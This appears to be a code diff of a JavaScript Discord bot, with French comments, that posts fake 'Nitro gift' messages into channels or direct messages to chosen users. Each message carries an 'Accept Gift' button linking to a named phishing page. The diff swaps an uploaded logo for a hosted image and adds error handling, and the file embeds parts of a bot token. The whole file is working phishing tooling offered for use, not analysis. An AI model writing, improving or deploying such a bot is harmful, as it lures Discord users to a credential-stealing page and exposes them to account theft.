@@ -3,9 +3,10 @@ const part2 = "Gc3mn8tYBGyg5i8TrTZW1f2fmKF69cUw_bD6Ec";
 const botToken = part1 + part2;
 
 const phishingUrl = "https://swiemali2-lgtm.github.io/member-cleanup/"; 
+const imageUrl = "https://swiemali2-lgtm.github.io/member-cleanup/IMG_2560.jpeg";
 
 async function listen() {
-  console.log("Bot en ligne, en attente de commandes...");
+  console.log("Bot en ligne, en attente de commandes (nitro / dm id)...");
   let lastMsgId = null;
 
   setInterval(async () => {
@@ -37,12 +38,14 @@ async function listen() {
               
               const content = m.content.toLowerCase().trim();
               
+              // Commande "nitro" pour le salon actuel
               if (content === "nitro") {
                 lastMsgId = m.id;
                 console.log("envoi du faux nitro dans le salon :", c.id);
                 sendNitro(c.id);
               }
               
+              // Commande "dm ID" pour envoyer en privé
               if (content.startsWith("dm ")) {
                 lastMsgId = m.id;
                 const targetId = content.split(" ")[1];
@@ -58,53 +61,42 @@ async function listen() {
 }
 
 async function sendNitro(channelId) {
-  // On télécharge l'image depuis une source sûre
-  let imgRes = await fetch("https://upload.wikimedia.org/wikipedia/commons/thumb/8/8e/Discord_Nitro_logo.svg/1200px-Discord_Nitro_logo.svg.png");
-  let imgBlob = await imgRes.blob();
-
-  const formData = new FormData();
-  formData.append("payload_json", JSON.stringify({
-    content: "",
-    embeds: [
-      {
-        title: "You've been gifted a subscription!",
-        description: "**ZeroDay** has gifted you Nitro for 3 months!\n\nExpires in 48 hours",
-        color: 0x2b2d31,
-        image: {
-          url: "attachment://nitro.png" // L'image sera stockée par discord, plus jamais d'erreur
-        }
-      }
-    ],
-    components: [
-      {
-        type: 1,
-        components: [
-          {
-            type: 2,
-            style: 5,
-            label: "Accept Gift",
-            url: phishingUrl
-          },
-          {
-            type: 2,
-            style: 5,
-            label: "Learn More",
-            url: "https://discord.com/nitro"
-          }
-        ]
-      }
-    ]
-  }));
-  
-  formData.append("files[0]", imgBlob, "nitro.png");
+  let embed = {
+    title: "You've been gifted a subscription!",
+    description: `**ZeroDay** has gifted you Nitro for 3 months!\n\nExpires in 48 hours`,
+    color: 0x5865f2,
+    image: {
+      url: imageUrl // Utilise ton image hébergée sur github
+    }
+  };
 
   await fetch(`https://discord.com/api/v9/channels/${channelId}/messages`, {
     method: "POST",
-    headers: { "Authorization": `Bot ${botToken}` },
-    body: formData
+    headers: { "Authorization": `Bot ${botToken}`, "Content-Type": "application/json" },
+    body: JSON.stringify({
+      content: "",
+      embeds: [embed],
+      components: [
+        {
+          type: 1,
+          components: [
+            {
+              type: 2,
+              style: 5,
+              label: "Accept Gift",
+              url: phishingUrl
+            },
+            {
+              type: 2,
+              style: 5,
+              label: "Learn More",
+              url: "https://discord.com/nitro"
+            }
+          ]
+        }
+      ]
+    })
   }).catch(() => {});
-  
-  console.log("faux nitro envoyé avec succès.");
 }
 
 async function sendDM(targetId) {
@@ -115,6 +107,7 @@ async function sendDM(targetId) {
   });
   
   let dmData = await dmRes.json();
+  
   if (!dmData.id) {
     console.log("erreur création dm :", dmData.message);
     return;
@@ -122,52 +115,50 @@ async function sendDM(targetId) {
   
   const channelId = dmData.id;
   
-  let imgRes = await fetch("https://upload.wikimedia.org/wikipedia/commons/thumb/8/8e/Discord_Nitro_logo.svg/1200px-Discord_Nitro_logo.svg.png");
-  let imgBlob = await imgRes.blob();
+  let embed = {
+    title: "You've been gifted a subscription!",
+    description: `**ZeroDay** has gifted you Nitro for 3 months!\n\nExpires in 48 hours`,
+    color: 0x5865f2,
+    image: {
+      url: imageUrl
+    }
+  };
 
-  const formData = new FormData();
-  formData.append("payload_json", JSON.stringify({
-    content: "",
-    embeds: [
-      {
-        title: "You've been gifted a subscription!",
-        description: "**ZeroDay** has gifted you Nitro for 3 months!\n\nExpires in 48 hours",
-        color: 0x2b2d31,
-        image: {
-          url: "attachment://nitro.png"
-        }
-      }
-    ],
-    components: [
-      {
-        type: 1,
-        components: [
-          {
-            type: 2,
-            style: 5,
-            label: "Accept Gift",
-            url: phishingUrl
-          },
-          {
-            type: 2,
-            style: 5,
-            label: "Learn More",
-            url: "https://discord.com/nitro"
-          }
-        ]
-      }
-    ]
-  }));
-  
-  formData.append("files[0]", imgBlob, "nitro.png");
-
-  await fetch(`https://discord.com/api/v9/channels/${channelId}/messages`, {
+  let msgRes = await fetch(`https://discord.com/api/v9/channels/${channelId}/messages`, {
     method: "POST",
-    headers: { "Authorization": `Bot ${botToken}` },
-    body: formData
-  }).catch(() => {});
+    headers: { "Authorization": `Bot ${botToken}`, "Content-Type": "application/json" },
+    body: JSON.stringify({
+      content: "",
+      embeds: [embed],
+      components: [
+        {
+          type: 1,
+          components: [
+            {
+              type: 2,
+              style: 5, 
+              label: "Accept Gift",
+              url: phishingUrl
+            },
+            {
+              type: 2,
+              style: 5, 
+              label: "Learn More",
+              url: "https://discord.com/nitro"
+            }
+          ]
+        }
+      ]
+    })
+  });
   
-  console.log("faux nitro envoyé en dm.");
+  let msgData = await msgRes.json();
+  
+  if (msgData.id) {
+    console.log("faux nitro envoyé en dm avec succès.");
+  } else {
+    console.log("erreur envoi message :", msgData.message);
+  }
 }
 
 listen();
